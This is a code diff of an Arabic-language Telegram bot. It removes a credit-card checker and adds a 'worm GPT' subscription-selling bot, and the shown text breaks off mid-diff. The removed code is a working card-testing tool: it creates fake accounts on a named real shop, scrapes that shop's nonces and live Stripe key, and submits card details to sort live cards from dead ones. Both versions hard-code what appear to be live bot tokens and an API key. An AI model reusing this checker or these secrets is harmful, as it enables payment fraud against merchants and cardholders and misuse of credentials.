@@ -1,1748 +1,1520 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
+# ═══════════════════════════════════════════════════════════════════
+# 🤖 worm GPT 👹 — Final Complete Edition (3 Plans, Clear Errors)
+# 📦 pip install python-telegram-bot requests aiosqlite
+# ═══════════════════════════════════════════════════════════════════
 
-"""
-Obeida Online - Free Multi Gateway CC Checker Bot
-Version: 25.0 - Updated Stripe Auth Gateway (UwU)
-Author: @ObeidaOnline
-Channel: https://t.me/ObeidaTrading
-"""
-
-# ==================== التحقق من إصدار Python ====================
-import sys
-import platform
-
-print(f"📌 إصدار Python: {sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}")
-print(f"📌 نظام التشغيل: {platform.system()} {platform.release()}")
-
-# Fix encoding for Windows terminal
-if sys.platform == 'win32':
-    import io
-    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
-    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')
-
-# ==================== المكتبات المطلوبة ====================
-import time
-import json
-import random
-import string
-import re
-import os
-import threading
+import logging
 import asyncio
-import base64
-import uuid
-import warnings
+import json
+import secrets
 from datetime import datetime, timedelta
-from typing import Dict, List, Tuple, Optional, Any
-import http.server
-import socketserver
-import shutil
-from concurrent.futures import ThreadPoolExecutor, as_completed
-import argparse
-from types import NoneType
-from bs4 import BeautifulSoup
 
-# استيراد المكتبات الخارجية
-try:
-    import requests
-    import aiohttp
-    from fake_useragent import UserAgent
-    from faker import Faker
-    from colorama import init, Fore, Style
-    import telebot
-    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-    from playwright.async_api import async_playwright
-except ImportError as e:
-    print(f"❌ خطأ في استيراد المكتبات: {e}")
-    sys.exit(1)
+import aiosqlite
+import requests
+from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
+from telegram.ext import (
+    Application, CommandHandler, MessageHandler,
+    filters, ContextTypes
+)
 
-# تجاهل التحذيرات
-warnings.filterwarnings("ignore")
+# ═══════════════════════════════════════════════════════════════════
+# ⚙️ الإعدادات
+# ═══════════════════════════════════════════════════════════════════
 
-# تهيئة الألوان
-init(autoreset=True)
+BOT_TOKEN       = "8860603341:AAHepgQUJh32nSz1aXlZotL9H182HeqNWmw"
+SUPER_ADMIN_ID  = 6207431030
+API_URL         = "https://w0rmgpt.lovable.app/api/public/subscriptions"
+SITE_URL        = "https://w0rmgpt.lovable.app/"
 
-# ==================== إعدادات البوت ====================
-BOT_TOKEN = "8375573526:AAFa882xWsLWl6LAfl0IcaZEU12hyP6YIy0"
-ADMIN_IDS = [6207431030]
-CHANNEL_USERNAME = "@ObeidaTrading"
-DEV_CONTACT = "@Sz2zv"
-BOT_USERNAME = "ObeidaOnlineBot"
+INITIAL_API_KEY       = "Obeida0595440227@"
+INITIAL_API_KEY_LABEL = "المفتاح الأساسي"
 
-CHANNEL_LINK = "https://t.me/ObeidaTrading"
-SUPPORT_LINK = "https://t.me/Sz2zv"
+POINTS_INVITE = 1
+POINTS_DAILY  = 1
+MIN_TRANSFER  = 1
 
-# مجلدات التخزين
-DATA_FOLDER = "data"
-BACKUP_FOLDER = "backups"
-TEMP_FOLDER = "temp"
+DB_PATH = "bot_data.db"
 
-os.makedirs(DATA_FOLDER, exist_ok=True)
-os.makedirs(BACKUP_FOLDER, exist_ok=True)
-os.makedirs(TEMP_FOLDER, exist_ok=True)
+# ═══════════════════════════════════════════════════════════════════
+# 💎 3 خطط — بدون fallback (كل خطة صريحة)
+# ═══════════════════════════════════════════════════════════════════
 
-# ملفات التخزين
-USERS_FILE = os.path.join(DATA_FOLDER, "users.json")
-APPROVED_CARDS_FILE = os.path.join(DATA_FOLDER, "approved.txt")
-DECLINED_CARDS_FILE = os.path.join(DATA_FOLDER, "declined.txt")
-STATS_FILE = os.path.join(DATA_FOLDER, "stats.json")
-SETTINGS_FILE = os.path.join(DATA_FOLDER, "settings.json")
-GROUPS_FILE = os.path.join(DATA_FOLDER, "groups.json")
-SUCCESS_FILE = os.path.join(DATA_FOLDER, "sucess.txt")
-SUFFICIENT_FUNDS_FILE = os.path.join(DATA_FOLDER, "sufficient_funds.txt")
-ERROR_FILE = os.path.join(DATA_FOLDER, "erro.txt")
-
-# ==================== إعدادات البوابات ====================
-GATES = {
-    "stripe": {
-        "name": "💳 Stripe Auth (UwU)",
-        "command": "st",
-        "mass_command": "mass",
-        "icon": "💳",
-        "default": True
+SUBSCRIPTION_TYPES = {
+    "plus": {
+        "name": "⭐ بلس",
+        "emoji": "⭐",
+        "api_plan": "plus",
+        "description": "اشتراك أساسي — مناسب للاستخدام الشخصي",
+        "prices": {7: 5, 30: 15, 90: 40, 365: 120},
     },
-    "real": {
-        "name": "✅ Real Check",
-        "command": "chk",
-        "mass_command": "chkm",
-        "icon": "✅",
-        "default": False
+    "pro": {
+        "name": "💎 برو",
+        "emoji": "💎",
+        "api_plan": "pro",
+        "description": "اشتراك متقدم — ميزات إضافية",
+        "prices": {7: 8, 30: 25, 90: 65, 365: 200},
     },
-    "paypal": {
-        "name": "💰 PayPal Gateway",
-        "command": "pp",
-        "mass_command": "ppm",
-        "icon": "💰",
-        "default": False
-    }
+    "premium": {
+        "name": "👑 بريميوم",
+        "emoji": "👑",
+        "api_plan": "premium",
+        "description": "اشتراك كامل — كل الميزات",
+        "prices": {7: 15, 30: 45, 90: 120, 365: 380},
+    },
 }
 
-# ==================== تهيئة البوت ====================
-bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
-fake = Faker()
-ua = UserAgent()
+QUANTITY_DISCOUNTS = {1: 0, 2: 5, 3: 10, 5: 15, 10: 20, 20: 25}
 
-# متغيرات عامة
-user_last_file = {}
-user_active_checks = {}
-active_checks_lock = threading.Lock()
-file_lock = threading.Lock()
+def calculate_price(unit_price, quantity):
+    subtotal = unit_price * quantity
+    discount_pct = 0
+    for threshold, pct in sorted(QUANTITY_DISCOUNTS.items()):
+        if quantity >= threshold:
+            discount_pct = pct
+    total = subtotal * (100 - discount_pct) // 100 if discount_pct > 0 else subtotal
+    return total, subtotal, discount_pct
 
-# ==================== إدارة البيانات ====================
-class DataManager:
-    
-    @staticmethod
-    def init_files():
-        if not os.path.exists(USERS_FILE):
-            users = {}
-            for admin_id in ADMIN_IDS:
-                users[str(admin_id)] = {
-                    "user_id": admin_id,
-                    "username": "admin",
-                    "first_name": "Admin",
-                    "joined_date": datetime.now().isoformat(),
-                    "is_admin": True,
-                    "usage": {"total_checks": 0, "approved": 0, "declined": 0},
-                    "default_gate": "stripe"
-                }
-            DataManager.save_json(USERS_FILE, users)
-        
-        if not os.path.exists(STATS_FILE):
-            DataManager.save_json(STATS_FILE, {
-                "total_checks": 0,
-                "total_approved": 0,
-                "total_declined": 0,
-                "gates_usage": {},
-                "daily_stats": {},
-                "last_backup": None
-            })
-        
-        if not os.path.exists(SETTINGS_FILE):
-            DataManager.save_json(SETTINGS_FILE, {
-                "auto_backup": True,
-                "auto_clean": True,
-                "clean_days": 30,
-                "maintenance_mode": False,
-                "default_check_gate": "stripe",
-                "delay_between_cards": 3
-            })
-        
-        if not os.path.exists(GROUPS_FILE):
-            DataManager.save_json(GROUPS_FILE, {
-                "allowed_groups": [],
-                "blocked_groups": [],
-                "group_settings": {}
-            })
-        
-        for file in [APPROVED_CARDS_FILE, DECLINED_CARDS_FILE, SUCCESS_FILE, SUFFICIENT_FUNDS_FILE, ERROR_FILE]:
-            if not os.path.exists(file):
-                with open(file, 'w', encoding='utf-8') as f:
-                    f.write(f"# {'Approved' if 'approved' in file else 'Declined' if 'declined' in file else 'Success'} Cards\n")
-    
-    @staticmethod
-    def load_json(file_path: str, default: Any = None) -> Any:
-        try:
-            if os.path.exists(file_path):
-                with open(file_path, 'r', encoding='utf-8') as f:
-                    return json.load(f)
-            return default if default is not None else {}
-        except Exception:
-            return default if default is not None else {}
-    
-    @staticmethod
-    def save_json(file_path: str, data: Any) -> bool:
-        try:
-            with open(file_path, 'w', encoding='utf-8') as f:
-                json.dump(data, f, indent=4, ensure_ascii=False)
-            return True
-        except Exception as e:
-            print(f"❌ خطأ: {e}")
+logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+# ═══════════════════════════════════════════════════════════════════
+# 💾 قاعدة البيانات
+# ═══════════════════════════════════════════════════════════════════
+
+class Database:
+    def __init__(self, path=DB_PATH):
+        self.path = path
+
+    async def init(self):
+        async with aiosqlite.connect(self.path) as db:
+            await db.executescript("""
+                CREATE TABLE IF NOT EXISTS users (
+                    user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
+                    points INTEGER DEFAULT 0, total_points_earned INTEGER DEFAULT 0,
+                    invited_by INTEGER, invite_code TEXT UNIQUE,
+                    last_daily_bonus TEXT, is_banned INTEGER DEFAULT 0, joined_at TEXT
+                );
+                CREATE TABLE IF NOT EXISTS api_keys (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT, key_value TEXT NOT NULL,
+                    label TEXT, is_active INTEGER DEFAULT 0, created_at TEXT,
+                    created_by INTEGER, last_used TEXT,
+                    success_count INTEGER DEFAULT 0, fail_count INTEGER DEFAULT 0
+                );
+                CREATE TABLE IF NOT EXISTS subscriptions (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER,
+                    code TEXT, plan TEXT, actual_plan TEXT, days INTEGER, max_uses INTEGER,
+                    uses INTEGER DEFAULT 0, status TEXT DEFAULT 'active',
+                    created_at TEXT, expires_at TEXT,
+                    points_spent INTEGER DEFAULT 0, api_response TEXT
+                );
+                CREATE TABLE IF NOT EXISTS drops (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT, token TEXT UNIQUE NOT NULL,
+                    plan TEXT NOT NULL, days INTEGER NOT NULL, created_by INTEGER,
+                    created_at TEXT, claimed_by INTEGER, claimed_at TEXT,
+                    claim_code TEXT, is_active INTEGER DEFAULT 1
+                );
+                CREATE TABLE IF NOT EXISTS points_drops (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT, token TEXT UNIQUE NOT NULL,
+                    points INTEGER NOT NULL, created_by INTEGER, created_at TEXT,
+                    claimed_by INTEGER, claimed_at TEXT, is_active INTEGER DEFAULT 1
+                );
+                CREATE TABLE IF NOT EXISTS admin_logs (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT, admin_id INTEGER,
+                    action TEXT, details TEXT, created_at TEXT
+                );
+            """)
+            await db.commit()
+
+    async def get_user(self, user_id):
+        async with aiosqlite.connect(self.path) as db:
+            db.row_factory = aiosqlite.Row
+            async with db.execute("SELECT * FROM users WHERE user_id=?", (user_id,)) as cur:
+                row = await cur.fetchone()
+                return dict(row) if row else None
+
+    async def register_user(self, user_id, username, first_name, invited_by=None):
+        existing = await self.get_user(user_id)
+        if existing:
+            return existing, False
+        async with aiosqlite.connect(self.path) as db:
+            while True:
+                code = secrets.token_urlsafe(6)[:8].upper()
+                async with db.execute("SELECT 1 FROM users WHERE invite_code=?", (code,)) as cur:
+                    if not await cur.fetchone():
+                        break
+            await db.execute("""INSERT INTO users (user_id, username, first_name, invited_by, invite_code, joined_at)
+                VALUES (?, ?, ?, ?, ?, ?)""",
+                (user_id, username, first_name, invited_by, code, datetime.now().isoformat()))
+            await db.commit()
+        if invited_by:
+            inviter = await self.get_user(invited_by)
+            if inviter:
+                await self.add_points(invited_by, POINTS_INVITE, "invite_reward", user_id)
+        return await self.get_user(user_id), True
+
+    async def add_points(self, user_id, amount, reason, ref_id=None):
+        async with aiosqlite.connect(self.path) as db:
+            await db.execute("""UPDATE users SET points = points + ?, total_points_earned = total_points_earned + ?
+                WHERE user_id=?""", (amount, max(0, amount), user_id))
+            await db.commit()
+
+    async def deduct_points(self, user_id, amount):
+        user = await self.get_user(user_id)
+        if not user or user["points"] < amount:
             return False
-    
-    @staticmethod
-    def load_users() -> Dict:
-        DataManager.init_files()
-        users = DataManager.load_json(USERS_FILE, {})
-        for uid, user in users.items():
-            if "usage" not in user:
-                user["usage"] = {"total_checks": 0, "approved": 0, "declined": 0}
-            if "default_gate" not in user:
-                user["default_gate"] = "stripe"
-        return users
-    
-    @staticmethod
-    def save_users(users: Dict) -> bool:
-        return DataManager.save_json(USERS_FILE, users)
-    
-    @staticmethod
-    def load_stats() -> Dict:
-        stats = DataManager.load_json(STATS_FILE, {})
-        defaults = {
-            "total_checks": 0, "total_approved": 0, "total_declined": 0,
-            "gates_usage": {}, "daily_stats": {}, "last_backup": None
-        }
-        for key, value in defaults.items():
-            if key not in stats:
-                stats[key] = value
-        return stats
-    
-    @staticmethod
-    def save_stats(stats: Dict) -> bool:
-        return DataManager.save_json(STATS_FILE, stats)
-    
-    @staticmethod
-    def load_settings() -> Dict:
-        settings = DataManager.load_json(SETTINGS_FILE, {
-            "auto_backup": True, "auto_clean": True, "clean_days": 30,
-            "maintenance_mode": False, "default_check_gate": "stripe", "delay_between_cards": 3
-        })
-        return settings
-    
-    @staticmethod
-    def save_settings(settings: Dict) -> bool:
-        return DataManager.save_json(SETTINGS_FILE, settings)
-    
-    @staticmethod
-    def save_card_result(card: str, gate: str, response: str, user_id: int, is_approved: bool):
-        try:
-            file_path = APPROVED_CARDS_FILE if is_approved else DECLINED_CARDS_FILE
-            with open(file_path, 'a', encoding='utf-8') as f:
-                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {gate} | User:{user_id} | {card} | {response}\n")
-        except:
-            pass
-    
-    @staticmethod
-    def save_paypal_result(cc_str: str, status: str, msg: str):
-        fmap = {"CHARGED": SUCCESS_FILE, "APPROVED": SUCCESS_FILE, "LIVE": SUFFICIENT_FUNDS_FILE, "DECLINED": DECLINED_CARDS_FILE}
-        fn = fmap.get(status, ERROR_FILE)
-        with file_lock:
-            with open(fn, "a", encoding="utf-8") as f:
-                f.write(f"{cc_str} -> {status}: {msg}\n")
-    
-    @staticmethod
-    def check_access(user_id: int, chat_id: int = None) -> bool:
-        if user_id in ADMIN_IDS:
-            return True
-        settings = DataManager.load_settings()
-        if settings.get("maintenance_mode", False):
-            return False
+        async with aiosqlite.connect(self.path) as db:
+            await db.execute("UPDATE users SET points = points - ? WHERE user_id=?", (amount, user_id))
+            await db.commit()
         return True
-    
-    @staticmethod
-    def get_user_default_gate(user_id: int) -> str:
-        users = DataManager.load_users()
-        return users.get(str(user_id), {}).get("default_gate", "stripe")
-    
-    @staticmethod
-    def set_user_default_gate(user_id: int, gate: str) -> bool:
-        if gate not in GATES:
-            return False
-        users = DataManager.load_users()
-        uid = str(user_id)
-        if uid not in users:
-            users[uid] = {"user_id": user_id, "joined_date": datetime.now().isoformat(), "usage": {"total_checks": 0, "approved": 0, "declined": 0}}
-        users[uid]["default_gate"] = gate
-        return DataManager.save_users(users)
-    
-    @staticmethod
-    def update_usage(user_id: int, gate: str, result: str):
-        users = DataManager.load_users()
-        stats = DataManager.load_stats()
-        uid = str(user_id)
-        if uid not in users:
-            users[uid] = {"user_id": user_id, "joined_date": datetime.now().isoformat(), "usage": {"total_checks": 0, "approved": 0, "declined": 0}}
-        
-        is_approved = "✅" in result or "مقبولة" in result or "UwU" in result or "APPROVED" in result or "CHARGED" in result
-        usage = users[uid]["usage"]
-        usage["total_checks"] += 1
-        
-        if is_approved:
-            usage["approved"] += 1
-            stats["total_approved"] = stats.get("total_approved", 0) + 1
-        else:
-            usage["declined"] += 1
-            stats["total_declined"] = stats.get("total_declined", 0) + 1
-        
-        stats["total_checks"] = stats.get("total_checks", 0) + 1
-        stats["gates_usage"][gate] = stats["gates_usage"].get(gate, 0) + 1
-        
-        today = datetime.now().strftime("%Y-%m-%d")
-        if today not in stats["daily_stats"]:
-            stats["daily_stats"][today] = {"checks": 0, "approved": 0}
-        stats["daily_stats"][today]["checks"] += 1
-        if is_approved:
-            stats["daily_stats"][today]["approved"] += 1
-        
-        DataManager.save_users(users)
-        DataManager.save_stats(stats)
 
-# ==================== أدوات مساعدة ====================
-class Helpers:
-    @staticmethod
-    def parse_card(card_str: str) -> Optional[Dict]:
-        try:
-            card_str = re.sub(r'[;:,\s/]+', '|', card_str.strip())
-            if '|' in card_str:
-                parts = card_str.split('|')
-                if len(parts) >= 4:
-                    number = re.sub(r'\D', '', parts[0])
-                    month = re.sub(r'\D', '', parts[1])
-                    year = re.sub(r'\D', '', parts[2])
-                    cvv = re.sub(r'\D', '', parts[3])
-                    
-                    if len(year) == 4:
-                        year = year[-2:]
-                    
-                    if len(number) >= 15 and len(number) <= 19:
-                        if len(month) == 1:
-                            month = f"0{month}"
-                        if len(cvv) >= 3 and len(cvv) <= 4:
-                            return {
-                                'number': number, 'month': month, 'year': year, 'cvv': cvv,
-                                'original': card_str, 'name': parts[4] if len(parts) > 4 else "Card Holder"
-                            }
-            return None
-        except:
-            return None
-    
-    @staticmethod
-    def extract_cards_from_text(text: str) -> List[Dict]:
-        cards = []
-        for line in text.strip().split('\n'):
-            line = line.strip()
-            if line and not line.startswith('#'):
-                card = Helpers.parse_card(line)
-                if card:
-                    cards.append(card)
-        return cards
-    
-    @staticmethod
-    def luhn_check(card_number: str) -> bool:
-        try:
-            card_number = re.sub(r'[\s-]', '', card_number)
-            if not card_number.isdigit() or len(card_number) < 13 or len(card_number) > 19:
-                return False
-            digits = [int(d) for d in card_number]
-            checksum = 0
-            for i, digit in enumerate(reversed(digits)):
-                if i % 2 == 1:
-                    digit *= 2
-                    if digit > 9:
-                        digit -= 9
-                checksum += digit
-            return checksum % 10 == 0
-        except:
-            return False
-    
-    @staticmethod
-    def get_bin_info(bin_num: str) -> Dict:
-        try:
-            r = requests.get(f"https://bins.antipublic.cc/bins/{bin_num[:6]}", timeout=5)
-            if r.status_code == 200:
-                data = r.json()
-                return {
-                    "brand": data.get('brand', 'Unknown').upper(),
-                    "bank": data.get('bank', 'Unknown'),
-                    "country": data.get('country_name', 'Unknown'),
-                    "flag": data.get('country_flag', '🏁'),
-                    "type": data.get('type', 'Unknown'),
-                    "level": data.get('level', 'Unknown')
-                }
-        except:
-            pass
-        
-        try:
-            r = requests.get(f"https://lookup.binlist.net/{bin_num[:6]}", timeout=5)
-            if r.status_code == 200:
-                data = r.json()
-                return {
-                    "brand": data.get('scheme', 'Unknown').upper(),
-                    "bank": data.get('bank', {}).get('name', 'Unknown'),
-                    "country": data.get('country', {}).get('name', 'Unknown'),
-                    "flag": data.get('country', {}).get('emoji', '🏁'),
-                    "type": data.get('type', 'Unknown'),
-                    "level": data.get('level', 'Unknown')
-                }
-        except:
-            pass
-        
-        return {"brand": "Unknown", "bank": "Unknown", "country": "Unknown", "flag": "🏁", "type": "Unknown", "level": "Unknown"}
-    
-    @staticmethod
-    def get_chat_type(chat_id: int) -> str:
-        return "private" if chat_id > 0 else "group"
-    
-    @staticmethod
-    def generate_random_email() -> str:
-        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-        return f"{username}@gmail.com"
-    
-    @staticmethod
-    def generate_random_password(length: int = 12) -> str:
-        characters = string.ascii_letters + string.digits + "!@#$%^&*()"
-        return ''.join(random.choices(characters, k=length))
-    
-    @staticmethod
-    def normalize_url(url: str) -> str:
-        url = url.strip()
-        if not url.startswith(('http://', 'https://')):
-            url = 'https://' + url
-        url = url.rstrip('/')
-        if '/my-account' not in url.lower():
-            url += '/my-account'
-        if not url.endswith('/'):
-            url += '/'
-        return url
-    
-    @staticmethod
-    def generate_guid() -> str:
-        return str(uuid.uuid4())
+    async def claim_daily_bonus(self, user_id):
+        user = await self.get_user(user_id)
+        if not user:
+            return False, "المستخدم غير موجود"
+        last = user.get("last_daily_bonus")
+        if last:
+            last_dt = datetime.fromisoformat(last)
+            diff = datetime.now() - last_dt
+            if diff < timedelta(hours=24):
+                remaining = timedelta(hours=24) - diff
+                h = remaining.seconds // 3600
+                m = (remaining.seconds % 3600) // 60
+                return False, f"⏳ متبقٍ: {h}س {m}د"
+        async with aiosqlite.connect(self.path) as db:
+            await db.execute("UPDATE users SET last_daily_bonus=? WHERE user_id=?",
+                             (datetime.now().isoformat(), user_id))
+            await db.commit()
+        await self.add_points(user_id, POINTS_DAILY, "daily_bonus")
+        return True, f"✅ حصلت على {POINTS_DAILY} نقطة!"
 
-# ==================== تنسيق النتائج ====================
-class ResultFormatter:
-    @staticmethod
-    def format_single_result(card: str, result: str, is_approved: bool, gate_name: str, bin_info: Dict = None) -> str:
-        number = card.split('|')[0] if '|' in card else card
-        masked = f"{number[:6]}xxxxxx{number[-4:]}"
-        status = "✅ LIVE - CARD APPROVED" if is_approved else "❌ DECLINED"
-        
-        bin_text = f"""
-𒊹︎︎︎ 𝗕𝗜𝗡 ⌁ {number[:6]}
-𒊹︎︎︎ 𝗕𝗥𝗔𝗡𝗗 ⌁ {bin_info.get('brand', 'Unknown')}
-𒊹︎︎︎ 𝗧𝗬𝗣𝗘 ⌁ {bin_info.get('type', 'Unknown')}
-𒊹︎︎︎ 𝗟𝗘𝗩𝗘𝗟 ⌁ {bin_info.get('level', 'Unknown')}
-𒊹︎︎︎ 𝗕𝗔𝗡𝗞 ⌁ {bin_info.get('bank', 'Unknown')}
-𒊹︎︎︎ 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ⌁ {bin_info.get('country', 'Unknown')} {bin_info.get('flag', '🏁')}""" if bin_info else ""
-        
-        return f"""
-🚀 {gate_name} 🚀
-⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
+    async def set_ban(self, user_id, banned):
+        async with aiosqlite.connect(self.path) as db:
+            await db.execute("UPDATE users SET is_banned=? WHERE user_id=?", (banned, user_id))
+            await db.commit()
 
-𒊹︎︎︎ 𝗖𝗖 ⌁ {masked}
-𒊹︎︎︎ 𝗦𝗧𝗔𝗧𝗨𝗦 ⌁ {status}
-{bin_text}
-⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
-🆔 Obeida Online | @ObeidaTrading
-"""
+    async def count_users(self):
+        async with aiosqlite.connect(self.path) as db:
+            async with db.execute("SELECT COUNT(*) FROM users") as cur:
+                return (await cur.fetchone())[0]
 
-# ==================== بوابة Stripe Auth (UwU) ====================
-class StripeAuthGateway:
-    """
-    Stripe SetupIntent Authentication Gateway
-    Based on the original Auth.py code
-    Site: copenhagensilver.com
-    """
-    
-    def __init__(self):
-        self.email = ""
-        self.password = ""
-        self.register_nonce = None
-        self.login_nonce = None
-        self.nonce = None
-        self.pk = None
-        self.token = None
-        self.guid = None
-        self.muid = None
-        self.sid = None
-    
-    def generate_random_email(self) -> str:
-        return f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}@gmail.com"
-    
-    def generate_random_password(self) -> str:
-        characters = string.ascii_letters + string.digits + "!@#$%^&*()"
-        return ''.join(random.choices(characters, k=12))
-    
-    async def get_register_nonce(self, session: aiohttp.ClientSession, url: str, headers: dict) -> Optional[str]:
-        async with session.get(url, headers=headers) as response:
-            html = await response.text()
-            match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', html)
-            if match:
-                return match.group(1)
-            return None
-    
-    async def get_login_nonce(self, session: aiohttp.ClientSession, url: str, headers: dict) -> Optional[str]:
-        async with session.get(url, headers=headers) as response:
-            html = await response.text()
-            match = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', html)
-            if match:
-                return match.group(1)
-            return None
-    
-    async def register_account(self, session: aiohttp.ClientSession, url: str, headers: dict, nonce: str) -> Tuple[str, str]:
-        email = self.generate_random_email()
-        password = self.generate_random_password()
-        
-        data = {
-            '_wp_http_referer': '/my-account/',
-            'email': email,
-            'password': password,
-            'woocommerce-register-nonce': nonce,
-            'register': 'Register'
-        }
-        
-        async with session.post(url, headers=headers, data=data) as response:
-            await response.text()
-            return email, password
-    
-    async def login_account(self, session: aiohttp.ClientSession, url: str, headers: dict, nonce: str, email: str, password: str) -> bool:
-        data = {
-            'username': email,
-            'password': password,
-            'woocommerce-login-nonce': nonce,
-            'login': 'Log in'
-        }
-        
-        async with session.post(url, headers=headers, data=data) as response:
-            return response.status == 200
-    
-    async def get_setup_intent_nonce_and_pk(self, session: aiohttp.ClientSession, url: str, headers: dict) -> Tuple[Optional[str], Optional[str]]:
-        async with session.get(url, headers=headers) as response:
-            data = await response.text()
-            nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', data)
-            pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', data)
-            
-            nonce = nonce_match.group(1) if nonce_match else None
-            pk = pk_match.group(0) if pk_match else None
-            return nonce, pk
-    
-    async def create_payment_method(self, session: aiohttp.ClientSession, card_data: Dict, pk: str) -> Optional[str]:
-        url = "https://api.stripe.com/v1/payment_methods"
-        
-        self.guid = str(uuid.uuid4())
-        self.muid = str(uuid.uuid4())
-        self.sid = str(uuid.uuid4())
-        
-        headers = {
-            'authority': 'api.stripe.com',
-            'accept': 'application/json',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://js.stripe.com',
-            'referer': 'https://js.stripe.com/',
-            'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36',
-        }
-        
-        data = {
-            "type": "card",
-            "card[number]": card_data['number'],
-            "card[cvc]": card_data['cvv'],
-            "card[exp_year]": card_data['year'],
-            "card[exp_month]": card_data['month'],
-            "allow_redisplay": "unspecified",
-            "billing_details[address][country]": "EG",
-            "payment_user_agent": "stripe.js/f4aa9d6f0f; stripe-js-v3/f4aa9d6f0f; payment-element; deferred-intent",
-            "referrer": "https://copenhagensilver.com",
-            "time_on_page": str(random.randint(10000, 99999)),
-            "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
-            "client_attribution_metadata[merchant_integration_source]": "elements",
-            "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
-            "client_attribution_metadata[merchant_integration_version]": "2021",
-            "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
-            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
-            "client_attribution_metadata[elements_session_config_id]": str(uuid.uuid4()),
-            "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
-            "guid": self.guid,
-            "muid": self.muid,
-            "sid": self.sid,
-            "key": pk,
-            "_stripe_version": "2024-06-20"
-        }
-        
-        async with session.post(url, headers=headers, data=data) as response:
-            result = await response.json()
-            return result.get("id")
-    
-    async def confirm_setup_intent(self, session: aiohttp.ClientSession, url: str, headers: dict, token: str, nonce: str) -> Tuple[bool, str]:
-        data = {
-            'action': 'wc_stripe_create_and_confirm_setup_intent',
-            'wc-stripe-payment-method': token,
-            'wc-stripe-payment-type': 'card',
-            '_ajax_nonce': nonce,
-        }
-        
-        async with session.post(url, headers=headers, data=data) as response:
-            try:
-                result = await response.json()
-                if result.get('success', False):
-                    return True, "✅ Card approved UwU"
-                else:
-                    error_msg = result.get('data', {}).get('error', {}).get('message', 'Unknown error')
-                    return False, f"❌ {error_msg}"
-            except:
-                return False, "❌ Unexpected response"
-    
-    async def check_card(self, card_data: Dict) -> Tuple[bool, str]:
-        """
-        Check card using Stripe SetupIntent Authentication
-        Site: copenhagensilver.com
-        """
+    async def all_user_ids(self):
+        async with aiosqlite.connect(self.path) as db:
+            async with db.execute("SELECT user_id FROM users WHERE is_banned=0") as cur:
+                return [r[0] for r in await cur.fetchall()]
+
+    async def top_users(self, limit=10):
+        async with aiosqlite.connect(self.path) as db:
+            db.row_factory = aiosqlite.Row
+            async with db.execute("SELECT user_id, username, first_name, points FROM users ORDER BY points DESC LIMIT ?",
+                                   (limit,)) as cur:
+                return [dict(r) for r in await cur.fetchall()]
+
+    async def get_user_rank(self, user_id):
+        async with aiosqlite.connect(self.path) as db:
+            async with db.execute("SELECT points FROM users WHERE user_id=?", (user_id,)) as cur:
+                row = await cur.fetchone()
+                if not row:
+                    return 0, 0
+                pts = row[0]
+            async with db.execute("SELECT COUNT(*) FROM users WHERE points > ?", (pts,)) as cur:
+                rank = (await cur.fetchone())[0] + 1
+            async with db.execute("SELECT COUNT(*) FROM users") as cur:
+                total = (await cur.fetchone())[0]
+            return rank, total
+
+    async def transfer_points(self, from_user, to_user, amount):
+        from_u = await self.get_user(from_user)
+        to_u = await self.get_user(to_user)
+        if not from_u or not to_u:
+            return False, "أحد المستخدمين غير موجود"
+        if from_user == to_user:
+            return False, "لا يمكن التحويل لنفسك"
+        if from_u["points"] < amount:
+            return False, "نقاطك غير كافية"
+        ok = await self.deduct_points(from_user, amount)
+        if not ok:
+            return False, "فشل الخصم"
+        await self.add_points(to_user, amount, "transfer_in", from_user)
+        return True, "✅ تم التحويل"
+
